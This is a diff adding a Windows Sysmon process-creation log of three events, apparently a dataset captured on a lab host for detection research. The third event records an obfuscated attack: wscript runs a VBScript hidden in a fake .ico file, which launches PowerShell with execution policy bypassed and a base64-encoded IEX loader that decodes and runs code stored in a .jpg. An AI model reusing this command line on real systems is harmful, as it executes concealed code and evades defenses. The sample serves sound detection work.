@@ -1,0 +1,128 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-08-14T11:53:29.688460000Z" />
+      <EventRecordID>10660</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2004" ThreadID="4480" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-08-14 11:53:29.423</Data>
+      <Data Name="ProcessGuid">{747f3d96-f639-5d53-0000-001067da2600}</Data>
+      <Data Name="ProcessId">1052</Data>
+      <Data Name="Image">C:\Windows\explorer.exe</Data>
+      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows Explorer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\windows\explorer.exe" shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}</Data>
+      <Data Name="CurrentDirectory">C:\windows\</Data>
+      <Data Name="User">MSEDGEWIN10\IEUser</Data>
+      <Data Name="LogonGuid">{747f3d96-f419-5d53-0000-002026910200}</Data>
+      <Data Name="LogonId">0x29126</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=B484455078341FE22D2D6CD5428672B36CFE9421,MD5=963AF95C42A986BBBB0B5C842140E008,SHA256=D9FCB47915363186AEC3EF3EDAE0D92AC452BFA5A41C81D5E714E45583600561,IMPHASH=D0321829F69F40C0D0D15614DB56687C</Data>
+      <Data Name="ParentProcessGuid">{747f3d96-f41e-5d53-0000-001067c80300}</Data>
+      <Data Name="ParentProcessId">4824</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-08-14T11:53:30.010140100Z" />
+      <EventRecordID>10661</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2004" ThreadID="4480" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-08-14 11:53:29.641</Data>
+      <Data Name="ProcessGuid">{747f3d96-f639-5d53-0000-001092ee2600}</Data>
+      <Data Name="ProcessId">6000</Data>
+      <Data Name="Image">C:\Windows\explorer.exe</Data>
+      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows Explorer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">C:\Windows\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">MSEDGEWIN10\IEUser</Data>
+      <Data Name="LogonGuid">{747f3d96-f419-5d53-0000-002026910200}</Data>
+      <Data Name="LogonId">0x29126</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=B484455078341FE22D2D6CD5428672B36CFE9421,MD5=963AF95C42A986BBBB0B5C842140E008,SHA256=D9FCB47915363186AEC3EF3EDAE0D92AC452BFA5A41C81D5E714E45583600561,IMPHASH=D0321829F69F40C0D0D15614DB56687C</Data>
+      <Data Name="ParentProcessGuid">{747f3d96-f413-5d53-0000-0010fa6e0000}</Data>
+      <Data Name="ParentProcessId">804</Data>
+      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k DcomLaunch -p</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-08-14T11:53:30.022856700Z" />
+      <EventRecordID>10662</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2004" ThreadID="4480" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-08-14 11:53:29.768</Data>
+      <Data Name="ProcessGuid">{747f3d96-f639-5d53-0000-0010b0fc2600}</Data>
+      <Data Name="ProcessId">8180</Data>
+      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
+      <Data Name="FileVersion">5.812.10240.16384</Data>
+      <Data Name="Description">Microsoft « Windows Based Script Host</Data>
+      <Data Name="Product">Microsoft « Windows Script Host</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"c:\windows\system32\wscript.exe" /E:vbs c:\windows\temp\icon.ico "powershell -exec bypass -c ""IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp')))"""</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">MSEDGEWIN10\IEUser</Data>
+      <Data Name="LogonGuid">{747f3d96-f419-5d53-0000-002026910200}</Data>
+      <Data Name="LogonId">0x29126</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=267D05CE8D10D97620BE1C7773757668BAEB19EE,MD5=F5E5DF6C9D62F4E940B334954A2046FC,SHA256=47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56,IMPHASH=0F71D5F6F4CBB935CE1B09754102419C</Data>
+      <Data Name="ParentProcessGuid">{747f3d96-f639-5d53-0000-001092ee2600}</Data>
+      <Data Name="ParentProcessId">6000</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding</Data>
+    </EventData>
+  </Event>
+</root>
